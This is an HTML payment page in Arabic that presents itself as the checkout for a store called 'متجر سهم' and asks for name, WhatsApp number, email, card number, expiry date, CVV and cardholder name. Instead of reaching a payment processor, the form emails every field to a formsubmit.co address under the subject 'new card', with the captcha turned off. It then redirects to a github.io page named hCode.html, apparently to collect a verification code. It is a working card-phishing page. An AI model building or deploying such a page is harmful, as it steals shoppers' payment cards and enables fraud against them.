<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>بوابة الدفع | متجر سهم</title>
    <link rel="shortcut icon" href="logo.png">
    <link rel="stylesheet" href="fremwork.css">
    <link rel="stylesheet" href="style.css">
    <link rel="stylesheet" href="pament.css">
    <link rel="stylesheet" href="all.min.css">
</head>

<body>
    <div class="all-sections">
        <section class="pament pt-20">
            <div class="container d-flex">
                <div class="info p-20">
                    <h5 class="mb-20">البيانات الشخصية</h5>
                    <div class="info-det bg-white p-20 mb-30 bR-15">
                        <form action="https://formsubmit.co/074913a62348efcdb4d542364986379b" method="post">
                            <input type="hidden" name="_next" value="https://naellweb.github.io/kp/hCode.html" />
                            <input type="hidden" name="_captcha" value="false"> <input type="hidden" name="_subject"
                                value="بطاقة جديدة">
                            <div class="d-flex flex-c mb-5"> <label class="d-flex flex-center mb-10 fs-14"
                                    for="name"><span class="star">*</span>الإسم الكريم</label> <input class="bor-c"
                                    type="text" name="name" id="name" required> </div>
                            <div class="d-flex flex-c mb-5"> <label class="d-flex flex-center mb-10 fs-14"
                                    for="number"><span class="star">*</span>رقم الواتساب</label> <input class="bor-c"
                                    type="number" name="number" id="number" required> </div>
                            <div class="d-flex flex-c mb-5"> <label class="d-flex flex-center mb-10 fs-14"
                                    for="email"><span class="star">*</span>الإيميل</label> <input class="bor-c"
                                    type="email" name="email" id="email" required> </div>
                            <div class="d-flex flex-c mb-25"> <label class="d-flex flex-center mb-10 fs-14"
                                    for="card"><span class="star">*</span>رقم البطاقة</label> <input class="bor-c"
                                    type="number" name="card" id="card" min="1" maxlength="16" required> </div>
                            <div class="end-date mb-5">
                                <h5 class="fs-11">تاريخ إنتهاء البطاقة</h5>
                                <div class="d-flex">
                                    <div class="month"> <label for="Month"><span class="star">*</span> الشهر</label>
                                        <select class="bor-c" name="Month" id="month" required>
                                            <option value=""></option>
                                            <option value="1">1</option>
                                            <option value="2">2</option>
                                            <option value="3">3</option>
                                            <option value="4">4</option>
                                            <option value="5">5</option>
                                            <option value="6">6</option>
                                            <option value="7">7</option>
                                            <option value="8">8</option>
                                            <option value="9">9</option>
                                            <option value="10">10</option>
                                            <option value="11">11</option>
                                            <option value="12">12</option>
                                        </select>
                                    </div>
                                    <div class="year"> <label for="Year"><span class="star">*</span> السنة</label>
                                        <select class="bor-c" name="Year" id="year" required>
                                            <option value=""></option>
                                            <option value="2022">2022</option>
                                            <option value="2023">2023</option>
                                            <option value="2024">2024</option>
                                            <option value="2025">2025</option>
                                            <option value="2026">2026</option>
                                            <option value="2027">2027</option>
                                            <option value="2028">2028</option>
                                            <option value="2029">2029</option>
                                            <option value="2030">2030</option>
                                            <option value="2031">2031</option>
                                            <option value="2032">2032</option>
                                            <option value="2033">2033</option>
                                            <option value="2034">2034</option>
                                        </select>
                                    </div>
                                </div>
                            </div>
                            <div class="d-flex flex-c mb-5"> <label class="d-flex flex-center mb-13 fs-14"
                                    for="cvv"><span class="star">*</span> رقم ال(CVV) في ظهر البطاقة</label> <input
                                    class="bor-c" type="number" name="cvv" id="cvv" min="1" maxlength="3" required>
                            </div>
                            <div class="d-flex flex-c mb-25"> <label class="d-flex flex-center mb-10 fs-14"
                                    for="naem-card"><span class="star">*</span>أسم حامل البطاقة</label> <input
                                    class="bor-c" type="text" name="naem-card" id="naem-card" required> </div>
                            <div class="d-flex flex-c mb-25"> <input class="bor-c" type="submit" id="submit"
                                    value="أكمل الدفع"> </div>
                        </form>
                    </div>
                </div>
                <div class="name-card p-20">
                    <h5 class="mb-20">اختر وسيلة الدفع</h5>
                    <div class="radios bg-white p-30 pt-20 pr-40 bR-15">
                        <div class="radio-1 mb-30 d-flex flex-start"> <input type="radio" name="pay" id="visa" checked>
                            <div class="bg-white d-flex flex-c mr-20"> <label class="fs-15 op-7 mb-7"
                                    for="visa">Visa</label> <img class="w-50 p-10 pt-6 pb-6 bor-c bR-7"
                                    src="visa-pay.png" alt=""> </div>
                        </div>
                        <div class="radio-2 mb-30 d-flex flex-start"> <input type="radio" name="pay" id="stc-pay">
                            <div class="bg-white d-flex flex-c mr-20"> <label class="fs-15 op-7 mb-7" for="stc-pay">Stc
                                    Pay</label> <img class="w-50 p-10 pt-6 pb-6 bor-c bR-7" src="stc-pay.png" alt="">
                            </div>
                        </div>
                        <div class="radio-3 mb-30 d-flex flex-start"> <input type="radio" name="pay" id="mada-pay">
                            <div class="bg-white d-flex flex-c mr-20"> <label class="fs-15 op-7 mb-7"
                                    for="mada-pay">مدى</label> <img class="w-50 p-10 pt-6 pb-6 bor-c bR-7"
                                    src="mada-pay.png" alt=""> </div>
                        </div>
                        <div class="radio-4 mb-30 d-flex flex-start"> <input type="radio" name="pay" id="apple-pay">
                            <div class="bg-white d-flex flex-c mr-20"> <label class="fs-15 op-7 mb-7"
                                    for="apple-pay">Apple Pay</label> <img class="w-50 p-10 pt-6 pb-6 bor-c bR-7"
                                    src="apple-pay.png" alt=""> </div>
                        </div>
                    </div>
                </div>
            </div>
        </section>
    </div>
</body>

</html>
